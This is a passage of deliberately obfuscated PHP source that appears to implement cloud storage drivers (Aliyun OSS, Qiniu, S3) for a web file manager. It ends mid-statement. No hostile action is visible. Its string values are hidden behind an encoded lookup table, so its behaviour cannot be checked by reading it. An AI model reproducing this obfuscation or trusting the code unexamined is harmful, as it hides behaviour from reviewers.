$äÈÌñĞ· = $this->_objectMeta($˜°îõ¥´); if (!$äÈÌñĞ·) { return $¥ÈØ…ß€[12]; } if (!isset($äÈÌñĞ·[$¥ÈØ…ß€[1445]]) && !empty($öÌ†ß¯µ)) { $›——Ùˆ = $this->updateObjMeta($˜°îõ¥´, array($¥ÈØ…ß€[1445] => $öÌ†ß¯µ)); $äÈÌñĞ·[$¥ÈØ…ß€[1445]] = $›——Ùˆ ? $öÌ†ß¯µ : $¥ÈØ…ß€[12]; } return isset($äÈÌñĞ·[$¥ÈØ…ß€[1445]]) ? strtolower($äÈÌñĞ·[$¥ÈØ…ß€[1445]]) : $¥ÈØ…ß€[12]; } public function size($ù½—ãåÏ) { $Ê¯œÀáÌ = $this->objectMeta($ù½—ãåÏ); return $Ê¯œÀáÌ ? $Ê¯œÀáÌ[$_SERVER[Î‹ÃÂŞ„][78]] : 0; } public function info($£ò’½Š) { if ($this->isFolder($£ò’½Š)) { return $this->folderInfo($£ò’½Š); } else { if ($this->isFile($£ò’½Š)) { return $this->fileInfo($£ò’½Š); } } return !1; } public function exist($Õº›œğĞ) { return $this->isFile($Õº›œğĞ) || $this->isFolder($Õº›œğĞ); } public function isFile($ğ¹Å±å¡) { return !$this->isFolder($ğ¹Å±å¡) && $this->objectMeta($ğ¹Å±å¡); } public function isFolder($Óûï‰ûñ) { return $this->cacheMethod($_SERVER[Î‹ÃÂŞ„][168], $Óûï‰ûñ); } protected function objectMeta($É²İòøÊ) { return $this->cacheMethod($_SERVER[Î‹ÃÂŞ„][170], $É²İòøÊ); } protected function _objectMeta($²Œ¦‡”Æ) { $ò×™ìÁ¯ =& $_SERVER[Î‹ÃÂŞ„]; try { $éÀ‡¨© = $this->client->getObjectMeta($this->bucket, $this->pathEncode($²Œ¦‡”Æ)); } catch (OSS\Core\OssException $ß¿‰¿—) { $éÀ‡¨© = !1; } if ($éÀ‡¨©) { $éÀ‡¨©[$ò×™ìÁ¯[78]] = intval($éÀ‡¨©[$ò×™ìÁ¯[1443]]); } return $éÀ‡¨©; } protected function _isFolder($Ë¦Ú„ÁÀ) { $’ÌÑ¥ñí =& $_SERVER[Î‹ÃÂŞ„]; if ($Ë¦Ú„ÁÀ == $’ÌÑ¥ñí[12] || $Ë¦Ú„ÁÀ == $’ÌÑ¥ñí[8]) { return !0; } $Â´ĞòÈ = array($’ÌÑ¥ñí[1438] => $’ÌÑ¥ñí[8], $’ÌÑ¥ñí[1439] => rtrim($Ë¦Ú„ÁÀ, $’ÌÑ¥ñí[8]) . $’ÌÑ¥ñí[8], $’ÌÑ¥ñí[1440] => 1, $’ÌÑ¥ñí[1441] => $’ÌÑ¥ñí[12]); $áöğŞ™ã = $this->client->listObjects($this->bucket, $Â´ĞòÈ); if ($áöğŞ™ã->getObjectList() || $áöğŞ™ã->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($œœÓöÈÇ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Î‹ÃÂŞ„][1469]; $this->_init($œœÓöÈÇ); } public function _init($ğÉû–›Î) { $›ñË‹†æ =& $_SERVER[Î‹ÃÂŞ„]; $this->config = $ğÉû–›Î; foreach ($ğÉû–›Î as $À×¢Åğ => $Öä Ãª¼) { if (isset($this->{$À×¢Åğ})) { $this->{$À×¢Åğ} = $Öä Ãª¼; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($›ñË‹†æ[1470] . LNG($›ñË‹†æ[1429])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ì©¹‚, $Œ©ìëÜ‹ = '', $Õ®ã…şß = REPEAT_RENAME) { if ($this->setContent($Ì©¹‚, $Œ©ìëÜ‹)) { return $this->getPathOuter($Ì©¹‚); } return !1; } public function mkdir($óØÚ²², $˜ç»ÑŒ = REPEAT_SKIP) { $Ò€½Êò¤ =& $_SERVER[Î‹ÃÂŞ„]; $Ÿñ÷¼œí = trim($óØÚ²², $Ò€½Êò¤[8]); if ($this->_isFolder($Ÿñ÷¼œí)) { return $this->getPathOuter($Ÿñ÷¼œí); } $óØÚ²² = $Ÿñ÷¼œí . $Ò€½Êò¤[8]; $¾«Ñ‹ìŒ = get_path_this($Ÿñ÷¼œí); $¹¨ãæÅÛ = $óØÚ²² . $¾«Ñ‹ìŒ; if (!$this->mkfile($¹¨ãæÅÛ)) { return !1; } if (!$this->moveFile($¹¨ãæÅÛ, $óØÚ²²)) { $this->delFile($¹¨ãæÅÛ); return !1; } return $this->getPathOuter($Ÿñ÷¼œí); } public function copyFile($ªÂŸÈƒŒ, $çÙîÌ) { $ñç¿¯Øï = $this->bucketManager->copy($this->bucket, $ªÂŸÈƒŒ, $this->bucket, $çÙîÌ, !0); return $ñç¿¯Øï ? !1 : $this->getPathOuter($çÙîÌ); } public function moveFile($–„È¿ï, $ØÎÀ¼Òæ) { $™—ÎğÕ = $this->bucketManager->move($this->bucket, $–„È¿ï, $this->bucket, $ØÎÀ¼Òæ, !0); return $™—ÎğÕ ? !1 : $this->getPathOuter($ØÎÀ¼Òæ); } public function delFile($ÀèÛ”½¿) { if (!$this->exist($ÀèÛ”½¿)) { return !0; } $¢ò’¥©ğ = $this->bucketManager->delete($this->bucket, $ÀèÛ”½¿); return $¢ò’¥©ğ ? !1 : !0; } public function delFolder($¤û›©”é) { $¶Öƒ˜ëù =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->exist($¤û›©”é)) { return !0; } $this->listItemCache = !1; $â€·†Ë = $this->fileList($¤û›©”é); $this->listItemCache = !0; $¸êš¦ı· = trim($¤û›©”é, $¶Öƒ˜ëù[8]) . $¶Öƒ˜ëù[8]; if (!empty($¤û›©”é) && $¤û›©”é !== $¶Öƒ˜ëù[214] && !in_array($¸êš¦ı·, $â€·†Ë[$¶Öƒ˜ëù[84]])) { $â€·†Ë[$¶Öƒ˜ëù[84]][] = $¸êš¦ı·; } $ê£¯—•Ş = $this->delByBatch($â€·†Ë[$¶Öƒ˜ëù[85]]); if (!$ê£¯—•Ş) { return !1; } $ê£¯—•Ş = $this->delByBatch($â€·†Ë[$¶Öƒ˜ëù[84]]); if (!$ê£¯—•Ş) { return !1; } return $this->delFile($¸êš¦ı·); } private function delByBatch($ğ‹¶åÏú) { foreach (array_chunk($ğ‹¶åÏú, 1000) as $ —êê¸†) { $Ê§ä‘Ä = $this->bucketManager->buildBatchDelete($this->bucket, $ —êê¸†); list($˜´äÕœ½, $Íæò·©) = $this->bucketManager->batch($Ê§ä‘Ä); if ($Íæò·©) { return !1; } } return !0; } public function rename($°€×÷’Ø, $¶¬“Íß÷) { return $this->renameObject($°€×÷’Ø, $¶¬“Íß÷); } public function fileInfo($“Ö‚©Á—, $í–íÓô = false, $¯‡ô¥Ç = array()) { $éÔ¡Í =& $_SERVER[Î‹ÃÂŞ„]; $‡Í«ùÓ = array($éÔ¡Í[32] => $this->pathThis($“Ö‚©Á—), $éÔ¡Í[86] => $this->getPathOuter($éÔ¡Í[8] . $“Ö‚©Á—), $éÔ¡Í[33] => $éÔ¡Í[216], $éÔ¡Í[78] => isset($¯‡ô¥Ç[$éÔ¡Í[1471]]) ? $¯‡ô¥Ç[$éÔ¡Í[1471]] : 0, $éÔ¡Í[177] => $this->ext($“Ö‚©Á—)); if ($í–íÓô) { return $‡Í«ùÓ; } $‡Í«ùÓ[$éÔ¡Í[217]] = $‡Í«ùÓ[$éÔ¡Í[87]] = 0; $‡Í«ùÓ[$éÔ¡Í[218]] = $‡Í«ùÓ[$éÔ¡Í[219]] = !0; if (empty($¯‡ô¥Ç)) { $¯‡ô¥Ç = $this->objectMeta($“Ö‚©Á—); if (!$¯‡ô¥Ç) { return $‡Í«ùÓ; } } if (isset($¯‡ô¥Ç[$éÔ¡Í[220]]) && $¯‡ô¥Ç[$éÔ¡Í[220]]) { $‡Í«ùÓ[$éÔ¡Í[221]] = $¯‡ô¥Ç[$éÔ¡Í[220]]; } if (isset($¯‡ô¥Ç[$éÔ¡Í[230]]) && $¯‡ô¥Ç[$éÔ¡Í[230]]) { $‡Í«ùÓ[$éÔ¡Í[221]] = $¯‡ô¥Ç[$éÔ¡Í[230]]; } if (isset($¯‡ô¥Ç[$éÔ¡Í[1472]])) { $‡Í«ùÓ[$éÔ¡Í[87]] = substr($¯‡ô¥Ç[$éÔ¡Í[1472]] . $éÔ¡Í[12], 0, 10); } if (isset($¯‡ô¥Ç[$éÔ¡Í[1471]])) { $‡Í«ùÓ[$éÔ¡Í[78]] = $¯‡ô¥Ç[$éÔ¡Í[1471]]; } return $‡Í«ùÓ; } public function folderInfo($Õ½í´‹Ø, $Ì¸¥œï¡ = false) { $ÂÎªù–í =& $_SERVER[Î‹ÃÂŞ„]; $¿çà ÀÚ = array($ÂÎªù–í[32] => $this->pathThis($Õ½í´‹Ø), $ÂÎªù–í[86] => $this->getPathOuter($ÂÎªù–í[8] . $Õ½í´‹Ø), $ÂÎªù–í[33] => $ÂÎªù–í[77]); if ($Ì¸¥œï¡) { return $¿çà ÀÚ; } $¿çà ÀÚ[$ÂÎªù–í[217]] = $¿çà ÀÚ[$ÂÎªù–í[87]] = 0; $¿çà ÀÚ[$ÂÎªù–í[218]] = $¿çà ÀÚ[$ÂÎªù–í[219]] = !0; $Õ½í´‹Ø = rtrim($Õ½í´‹Ø, $ÂÎªù–í[8]) . $ÂÎªù–í[8]; $Î÷ã± = $this->objectMeta($Õ½í´‹Ø); if (isset($Î÷ã±[$ÂÎªù–í[1472]])) { $¿çà ÀÚ[$ÂÎªù–í[87]] = substr($Î÷ã±[$ÂÎªù–í[1472]] . $ÂÎªù–í[12], 0, 10); } return $¿çà ÀÚ; } public function listPath($ûàÆÑ»Ã, $ñÚêœæÚ = false) { $±Á¦¡´ =& $_SERVER[Î‹ÃÂŞ„]; $âĞúşµ¤ = $this->fileList($ûàÆÑ»Ã, $±Á¦¡´[8], !0); foreach ($âĞúşµ¤[$±Á¦¡´[84]] as $ÆËÄõÇñ => $‹§¤Æß) { $âĞúşµ¤[$±Á¦¡´[84]][$ÆËÄõÇñ] = $this->folderInfo($‹§¤Æß, $ñÚêœæÚ); } foreach ($âĞúşµ¤[$±Á¦¡´[85]] as $ÆËÄõÇñ => $‹§¤Æß) { $âĞúşµ¤[$±Á¦¡´[85]][$ÆËÄõÇñ] = $this->fileInfo($‹§¤Æß[$±Á¦¡´[96]], $ñÚêœæÚ, $‹§¤Æß); } return $âĞúşµ¤; } public function has($İ¶Ø£ê, $›–÷Ïş = false, $ñÃÇÄ”ş = true) { $è¦×ŒŞ¨ =& $_SERVER[Î‹ÃÂŞ„]; $İ¶Ø£ê = trim($İ¶Ø£ê, $è¦×ŒŞ¨[8]); $’áá¦Î¡ = empty($İ¶Ø£ê) && $İ¶Ø£ê !== $è¦×ŒŞ¨[214] ? $è¦×ŒŞ¨[12] : $İ¶Ø£ê . $è¦×ŒŞ¨[8]; $ï¥•‡¢µ = $è¦×ŒŞ¨[12]; $‚ÍÀË®Õ = 500; $‚‘ºÕ”© = $è¦×ŒŞ¨[8]; $ö»Û¦ã = $ßçÈÈö = 0; while (!0) { check_abort(); list($Îº úàô, $¼´£ëı) = $this->bucketManager->listFiles($this->bucket, $’áá¦Î¡, $ï¥•‡¢µ, $‚ÍÀË®Õ, $‚‘ºÕ”©); if ($¼´£ëı) { break; } $ï¥•‡¢µ = array_key_exists($è¦×ŒŞ¨[1441], $Îº úàô) ? $ï¥•‡¢µ = $Îº úàô[$è¦×ŒŞ¨[1473]] : $è¦×ŒŞ¨[12]; if ($›–÷Ïş) { if (!empty($Îº úàô[$è¦×ŒŞ¨[1474]])) { $ö»Û¦ã += count($Îº úàô[$è¦×ŒŞ¨[1474]]); } if (!empty($Îº úàô[$è¦×ŒŞ¨[1475]])) { $ßçÈÈö += count($Îº úàô[$è¦×ŒŞ¨[1475]]); } if ($ï¥•‡¢µ === $è¦×ŒŞ¨[12]) { break; } continue; } if ($ñÃÇÄ”ş) { if (!empty($Îº úàô[$è¦×ŒŞ¨[1474]])) { return !0; } } else { if (!empty($Îº úàô[$è¦×ŒŞ¨[1475]])) { return !0; } } if ($ï¥•‡¢µ === $è¦×ŒŞ¨[12]) { break; } } if ($›–÷Ïş) { return array($è¦×ŒŞ¨[225] => $ö»Û¦ã, $è¦×ŒŞ¨[226] => $ßçÈÈö); } return !1; } public function listAll($ÆëæÂêÁ) { $éîİ«î =& $_SERVER[Î‹ÃÂŞ„]; $…×Ùš¤İ = $this->fileList($ÆëæÂêÁ, $éîİ«î[12], !0); $¢ƒìÉêØ = array_to_keyvalue($…×Ùš¤İ[$éîİ«î[85]], $éîİ«î[32]); foreach ($…×Ùš¤İ[$éîİ«î[84]] as $¾šÉÀ´˜) { if (is_string($¾šÉÀ´˜)) { $¢ƒìÉêØ[$¾šÉÀ´˜] = array($éîİ«î[78] => 0); } } return $this->listAllFiles($ÆëæÂêÁ, $¢ƒìÉêØ); } private function fileList($½¤ÔÂÀâ, $­š±¯‡ğ = '', $¸…öİ­ = 0) { $¨‹”×û‰ =& $_SERVER[Î‹ÃÂŞ„]; $½¤ÔÂÀâ = trim($½¤ÔÂÀâ, $¨‹”×û‰[8]); $‰€…ï÷Ò = empty($½¤ÔÂÀâ) && $½¤ÔÂÀâ !== $¨‹”×û‰[214] ? $¨‹”×û‰[12] : $½¤ÔÂÀâ . $¨‹”×û‰[8]; $„â…®¶â = $¨‹”×û‰[12]; $·¨Ğãìò = 1000; $Ñ¬Ôá·¸ = $ğú‡å¨æ = array(); while (!0) { check_abort(); list($’áÆ“ò, $öÈÜˆÛ€) = $this->bucketManager->listFiles($this->bucket, $‰€…ï÷Ò, $„â…®¶â, $·¨Ğãìò, $­š±¯‡ğ); if ($öÈÜˆÛ€) { break; } $„â…®¶â = array_key_exists($¨‹”×û‰[1441], $’áÆ“ò) ? $„â…®¶â = $’áÆ“ò[$¨‹”×û‰[1473]] : $¨‹”×û‰[12]; $ñƒÓå„é = isset($’áÆ“ò[$¨‹”×û‰[1474]]) ? $’áÆ“ò[$¨‹”×û‰[1474]] : array(); $Øü¦¢Ê = isset($’áÆ“ò[$¨‹”×û‰[1475]]) ? $’áÆ“ò[$¨‹”×û‰[1475]] : array(); foreach ($ñƒÓå„é as $Ğ±–ĞÖ) { if ($Ğ±–ĞÖ[$¨‹”×û‰[96]] == $‰€…ï÷Ò) { continue; } $†É‡¬‚ = $Ğ±–ĞÖ[$¨‹”×û‰[96]]; $¸¾™Ëş˜ = $Ğ±–ĞÖ[$¨‹”×û‰[1471]]; $Ğ±–ĞÖ[$¨‹”×û‰[78]] = $¸¾™Ëş˜; $ÖÏÀÀÂ  = $¸¾™Ëş˜ == 0 && substr($†É‡¬‚, strlen($†É‡¬‚) - 1, 1) == $¨‹”×û‰[8] ? !0 : !1; $this->cacheMethodInfoSet($†É‡¬‚, $ÖÏÀÀÂ , $Ğ±–ĞÖ); if ($ÖÏÀÀÂ ) { $Ñ¬Ôá·¸[] = $†É‡¬‚; continue; } $ğú‡å¨æ[] = $¸…öİ­ ? $Ğ±–ĞÖ : $†É‡¬‚; } foreach ($Øü¦¢Ê as $†É‡¬‚) { if ($†É‡¬‚ == $‰€…ï÷Ò) { continue; } $Ñ¬Ôá·¸[] = $†É‡¬‚; $this->cacheMethodInfoSet($†É‡¬‚, !0); } if ($„â…®¶â === $¨‹”×û‰[12]) { break; } } $this->cacheMethodInfoSet($½¤ÔÂÀâ, !0); return array($¨‹”×û‰[84] => $Ñ¬Ôá·¸, $¨‹”×û‰[85] => $ğú‡å¨æ); } public function canRead($âÎ¸š³) { return $this->exist($âÎ¸š³) ? !0 : !1; } public function canWrite($±áØ™ƒ) { return $this->exist($±áØ™ƒ) ? !0 : !1; } public function getContent($×õğ·ä¾) { return $this->fileSubstr($×õğ·ä¾, 0, -1); } public function setContent($“¾Õ¨³², $¡ÄşÜ¨ü = '') { $ëù­Ãöç = $this->tempFile($this->pathThis($“¾Õ¨³²)); file_put_contents($ëù­Ãöç, $¡ÄşÜ¨ü); if ($this->upload($“¾Õ¨³², $ëù­Ãöç)) { $this->tempFileRemve($ëù­Ãöç); return !0; } return !1; } public function refreshUrls($ğîãØ°à) { $«§Äöã =& $_SERVER[Î‹ÃÂŞ„]; $È†²ÊÀ¹ = array(); if (is_array($ğîãØ°à)) { foreach ($ğîãØ°à as $È“Æ†±ï) { $È†²ÊÀ¹[] = $this->link($È“Æ†±ï); } } else { $È†²ÊÀ¹[] = $this->link($ğîãØ°à); } $û´ÀÓ» = new Qiniu\Cdn\CdnManager($this->auth); list($­ºÁïõí, $§¬°ÃöÑ) = $û´ÀÓ»->refreshUrls($È†²ÊÀ¹); if ($§¬°ÃöÑ) { return !1; } return $­ºÁïõí[$«§Äöã[1237]] == $«§Äöã[806] ? !0 : !1; } public function fileSubstr($¼µ¶È³, $§„Ÿ…™, $øşùáÙ¹) { $¹ö†‰û“ =& $_SERVER[Î‹ÃÂŞ„]; if (!($á¶†Û‰á = $this->link($¼µ¶È³))) { return !1; } $ı¶§èÈÍ = !1; if ($øşùáÙ¹ > 0) { $©±¶²Šæ = $§„Ÿ…™ + $øşùáÙ¹ - 1; $ı¶§èÈÍ = array($¹ö†‰û“[1476] . $§„Ÿ…™ . $¹ö†‰û“[432] . $©±¶²Šæ); } $€‹ãÉïœ = url_request($á¶†Û‰á, $¹ö†‰û“[247], !1, $ı¶§èÈÍ); return $€‹ãÉïœ[$¹ö†‰û“[797]] ? $€‹ãÉïœ[$¹ö†‰û“[1257]] : !1; } public function upload($—²íÑØÓ, $ø¸™ÈÕˆ, $¿íÚÅñ = false, $éŒ„Æ˜ = REPEAT_REPLACE) { $±ÁÄšãÍ = new Qiniu\Storage\UploadManager(); $åçåŒó = $this->auth->uploadToken($this->bucket, $—²íÑØÓ); $–œÂŠŞª = get_file_mime(get_path_ext($ø¸™ÈÕˆ)); list($Í¥ÅèÃ , $ñÒôÇ•¶) = $±ÁÄšãÍ->putFile($åçåŒó, $—²íÑØÓ, $ø¸™ÈÕˆ, null, $–œÂŠŞª); return $ñÒôÇ•¶ ? !1 : $this->getPathOuter($—²íÑØÓ); } public function uploadFormData($îé¹Í», $£úÌÃ…› = 3600) { return $this->uploadToken($îé¹Í», $£úÌÃ…›); } public function multiUploadFormData($×˜èê÷Û, $¼Î‚­é = 3600) { return $this->uploadToken($×˜èê÷Û, $¼Î‚­é); } private function uploadToken($¶š™«Ë, $‚ö‰Ÿ÷Ì = 3600) { $£ú“æ•™ =& $_SERVER[Î‹ÃÂŞ„]; $­†§ÛÆ‹ = $‚ö‰Ÿ÷Ì; $³”ÓŞ‚â = array($£ú“æ•™[1477] => $£ú“æ•™[1478]); $†æÛ‡“Ğ = $¶š™«Ë; $æÕÂ×à° = $this->auth->uploadToken($this->bucket, $†æÛ‡“Ğ, $­†§ÛÆ‹, $³”ÓŞ‚â, !0); $È¿‹öÑÒ = empty($this->region) || $this->region == $£ú“æ•™[1479] ? $£ú“æ•™[12] : $£ú“æ•™[432] . $this->region; $áª©Ÿƒæ = http_type() . "\72\57\x2f\x75\x70\x6c\x6f\x61\x64{$È¿‹öÑÒ}\56\x71\x69\156\151\x75\x70\56\143\157\x6d\57"; return array($£ú“æ•™[1480] => $æÕÂ×à°, $£ú“æ•™[1481] => $áª©Ÿƒæ); } public function download($©ØÙÚŞÉ, $ì­ÖÏ¡Ù) { $È¢¢ü¹¥ = IO::getPathInner(IO::mkfile($ì­ÖÏ¡Ù)); if (!($ïü‰Äá» = $this->link($©ØÙÚŞÉ))) { return !1; } $è¥ô¡ÂÔ = 0; $´Œ×û½• = 1024 * 200; $«Ü»¥£Ä = fopen($È¢¢ü¹¥, $_SERVER[Î‹ÃÂŞ„][1482]); while (!0) { $ÆÅœ‰œ‚ = $this->fileSubstr($©ØÙÚŞÉ, $è¥ô¡ÂÔ, $´Œ×û½•); if ($ÆÅœ‰œ‚ === !1) { return !1; } fwrite($«Ü»¥£Ä, $ÆÅœ‰œ‚); $è¥ô¡ÂÔ += $´Œ×û½•; if (strlen($ÆÅœ‰œ‚) < $´Œ×û½•) { break; } } fclose($«Ü»¥£Ä); return $ì­ÖÏ¡Ù; } public function link($ûËğÎ‘Ù, $Ã¿±Å÷ = '') { if (!$this->isFile($ûËğÎ‘Ù)) { return !1; } $îÆ’Ò® = $this->getHost() . $_SERVER[Î‹ÃÂŞ„][8] . $this->pathEncode($ûËğÎ‘Ù) . $Ã¿±Å÷; return $this->auth->privateDownloadUrl($îÆ’Ò®, 3600 * 12); } public function fileOut($ Ïá×‹, $Û÷‘×“ = false, $µ£ûÓ•° = false, $û¦ÕÇ×ü = '') { $ä¿¿ïı† =& $_SERVER[Î‹ÃÂŞ„]; if ($this->isFileOutServer()) { return $this->fileOutServer($ Ïá×‹, $Û÷‘×“, $µ£ûÓ•°, $û¦ÕÇ×ü); } if (!$µ£ûÓ•°) { $µ£ûÓ•° = $this->pathThis($ Ïá×‹); } $©Ü¦—µÏ = $Û÷‘×“ ? $ä¿¿ïı†[1483] . rawurlencode($µ£ûÓ•°) : $ä¿¿ïı†[12]; $²§‘‘É† = $this->link($ Ïá×‹, $©Ü¦—µÏ); $this->fileOutLink($²§‘‘É†); } public function fileOutServer($ÁËĞ®®œ, $á„÷Ñµî = false, $ãƒ’Ğèû = false, $™ˆ—×å« = '') { parent::fileOut($ÁËĞ®®œ, $á„÷Ñµî, $ãƒ’Ğèû, $™ˆ—×å«); } public function fileOutImage($™ïÖŞÔæ, $Ş‚ÌÓ» = 250) { $ï•ş×·à = $this->link($™ïÖŞÔæ, $_SERVER[Î‹ÃÂŞ„][1484] . $Ş‚ÌÓ»); $this->fileOutLink($ï•ş×·à); } public function fileOutImageServer($‡æ´ı÷¸, $´—Õó„¨ = 250) { parent::fileOutImage($‡æ´ı÷¸, $´—Õó„¨); } public function hashMd5($ØŞ±Á†˜) { $¯±œÛ¦ =& $_SERVER[Î‹ÃÂŞ„]; $Åüßö…¾ = $this->objectMeta($ØŞ±Á†˜); return isset($Åüßö…¾[$¯±œÛ¦[230]]) ? $Åüßö…¾[$¯±œÛ¦[230]] : !1; $«áˆöÙ› = $this->link($ØŞ±Á†˜, $¯±œÛ¦[1485]); } public function size($•„Ç°Ó) { $©§æô˜† = $this->objectMeta($•„Ç°Ó); return $©§æô˜† ? $©§æô˜†[$_SERVER[Î‹ÃÂŞ„][78]] : 0; } public function info($œ¤ Õ•) { if ($this->isFolder($œ¤ Õ•)) { return $this->folderInfo($œ¤ Õ•); } else { if ($this->isFile($œ¤ Õ•)) { return $this->fileInfo($œ¤ Õ•); } } return !1; } public function exist($¾¦œøö») { return $this->isFile($¾¦œøö») || $this->isFolder($¾¦œøö»); } public function isFile($…Åµı¿à) { return !$this->isFolder($…Åµı¿à) && $this->objectMeta($…Åµı¿à); } public function isFolder($³ïáé¼å) { return $this->cacheMethod($_SERVER[Î‹ÃÂŞ„][168], $³ïáé¼å); } protected function objectMeta($åÕÆ÷Š×) { return $this->cacheMethod($_SERVER[Î‹ÃÂŞ„][170], $åÕÆ÷Š×); } protected function _objectMeta($É´ì˜µÇ) { $ìÚ¿ƒÇ =& $_SERVER[Î‹ÃÂŞ„]; list($áá…¥ù‚, $¥ª‰óšÅ) = $this->bucketManager->stat($this->bucket, $É´ì˜µÇ); if ($áá…¥ù‚) { $áá…¥ù‚[$ìÚ¿ƒÇ[78]] = intval($áá…¥ù‚[$ìÚ¿ƒÇ[1471]]); } return $áá…¥ù‚; } protected function _isFolder($Çà™ÃÓ“) { $»òô¸ÒÖ =& $_SERVER[Î‹ÃÂŞ„]; if ($Çà™ÃÓ“ == $»òô¸ÒÖ[12] || $Çà™ÃÓ“ == $»òô¸ÒÖ[8]) { return !0; } list($‹Ó…ı¾, $¢Œ§¸òö) = $this->bucketManager->listFiles($this->bucket, trim($Çà™ÃÓ“, $»òô¸ÒÖ[8]) . $»òô¸ÒÖ[8], $»òô¸ÒÖ[12], 1, $»òô¸ÒÖ[8]); return !empty($‹Ó…ı¾[$»òô¸ÒÖ[1474]]) || !empty($‹Ó…ı¾[$»òô¸ÒÖ[1475]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($×ä…œÆ) { parent::__construct($×ä…œÆ); } public function uploadFormData($×ò‰úËî, $ÕÕ¸ÑÛ = 3600) { $£«ã•²Ô =& $_SERVER[Î‹ÃÂŞ„]; $¬ªÈŠµ¸ = $£«ã•²Ô[215]; $¹Ÿè„‚À = $£«ã•²Ô[255]; $ŞìÇíà = $£«ã•²Ô[62]; $ºœ×şôî = gmdate($£«ã•²Ô[256]); $›©öºãØ = gmdate($£«ã•²Ô[257]); $·ŸÙ½Òì = $£«ã•²Ô[258]; $ÍÂ™íáÜ = $ÕÕ¸ÑÛ . $£«ã•²Ô[12]; $ÊÉºÙÇ = $£«ã•²Ô[259]; $´åø˜Ñà = array($this->accessKey, $›©öºãØ, $this->region, $ŞìÇíà, $·ŸÙ½Òì); $åŠš×ØÑ = implode($£«ã•²Ô[8], $´åø˜Ñà); $—ÃÁî§Â = array($£«ã•²Ô[260] => gmdate($£«ã•²Ô[1380], strtotime($£«ã•²Ô[262])), $£«ã•²Ô[263] => array(array($£«ã•²Ô[264] => $this->bucket), array($£«ã•²Ô[265] => $¬ªÈŠµ¸), array($£«ã•²Ô[266], $£«ã•²Ô[267], $£«ã•²Ô[12]), array($£«ã•²Ô[266], $£«ã•²Ô[268], $£«ã•²Ô[12]), array($£«ã•²Ô[266], $£«ã•²Ô[269], $£«ã•²Ô[12]), array($£«ã•²Ô[270] => $ÊÉºÙÇ), array($£«ã•²Ô[271] => $åŠš×ØÑ), array($£«ã•²Ô[272] => $¹Ÿè„‚À), array($£«ã•²Ô[273] => $ºœ×şôî), array($£«ã•²Ô[274] => $ÍÂ™íáÜ))); $Ï¥œšÂ = base64_encode(json_encode($—ÃÁî§Â)); $ÄùÍ¶ì = hash_hmac($£«ã•²Ô[275], $›©öºãØ, $£«ã•²Ô[276] . $this->secret, !0); $ãé“ ¢ = hash_hmac($£«ã•²Ô[275], $this->region, $ÄùÍ¶ì, !0); $ÙÀ“‡‘“ = hash_hmac($£«ã•²Ô[275], $ŞìÇíà, $ãé“ ¢, !0); $¦ÄÖ´Œ‰ = hash_hmac($£«ã•²Ô[275], $·ŸÙ½Òì, $ÙÀ“‡‘“, !0); $¿·Ëû¥ç = hash_hmac($£«ã•²Ô[275], $Ï¥œšÂ, $¦ÄÖ´Œ‰); $ÀÔÂ¥€ó = array($£«ã•²Ô[232] => $£«ã•²Ô[12], $£«ã•²Ô[277] => $£«ã•²Ô[12], $£«ã•²Ô[265] => $¬ªÈŠµ¸, $£«ã•²Ô[270] => $ÊÉºÙÇ, $£«ã•²Ô[278] => $Ï¥œšÂ, $£«ã•²Ô[279] => $åŠš×ØÑ, $£«ã•²Ô[280] => $¹Ÿè„‚À, $£«ã•²Ô[281] => $ºœ×şôî, $£«ã•²Ô[282] => $ÍÂ™íáÜ, $£«ã•²Ô[283] => $¿·Ëû¥ç, $£«ã•²Ô[198] => $this->getHost()); return $ÀÔÂ¥€ó; } public function multiUploadFormData($Çôˆ¿¬Ç, $üù¡í = 3600) { $ÚÃñ·Î³ =& $_SERVER[Î‹ÃÂŞ„]; $ßèùˆÑŞ = gmdate($ÚÃñ·Î³[1486]); $ËŠôèÖÚ = array(); $Úİ·÷›î = $this->client->getUploadId($this->bucket, $Çôˆ¿¬Ç, $ËŠôèÖÚ); if (!$Úİ·÷›î) { return !1; } return array($ÚÃñ·Î³[240] => $Úİ·÷›î, $ÚÃñ·Î³[198] => $this->getHost() . $ÚÃñ·Î³[8] . $this->pathEncode($Çôˆ¿¬Ç), $ÚÃñ·Î³[241] => $ßèùˆÑŞ, $ÚÃñ·Î³[96] => $Çôˆ¿¬Ç); } public function multiUploadAuthData($´ƒ²À¢¼, $˜¸‰ê©á = array()) { $˜ïöıØ£ =& $_SERVER[Î‹ÃÂŞ„]; $íáıŞ—Ç = isset($˜¸‰ê©á[$˜ïöıØ£[177]]) ? $˜¸‰ê©á[$˜ïöıØ£[177]] : $˜ïöıØ£[12]; $Ì´«õæ = $˜¸‰ê©á[$˜ïöıØ£[96]]; unset($˜¸‰ê©á[$˜ïöıØ£[96]]); if (isset($˜¸‰ê©á[$˜ïöıØ£[242]])) { return $this->listUploadParts($Ì´«õæ, $˜¸‰ê©á); } $ØÑÆ‡ı– = array(); if (isset($˜¸‰ê©á[$˜ïöıØ£[1487]])) { $ØÑÆ‡ı–[$˜ïöıØ£[1488]] = $˜¸‰ê©á[$˜ïöıØ£[1487]]; } $Åáé³ÄŞ = explode($˜ïöıØ£[200], $this->getHost()); $­Òğ ¤ = array($˜ïöıØ£[1489] => $Åáé³ÄŞ[1], $˜ïöıØ£[1490] => $˜ïöıØ£[12], $˜ïöıØ£[232] => $˜ïöıØ£[122], $˜ïöıØ£[277] => $˜¸‰ê©á[$˜ïöıØ£[78]]); $¬ï„ä¾€ = $˜ïöıØ£[245]; $üíú¬Ÿ¯ = $˜ïöıØ£[8] . $this->pathEncode($Ì´«õæ) . $íáıŞ—Ç; $Í‹êµ = $this->client->__getSignatureV4($ØÑÆ‡ı–, $­Òğ ¤, 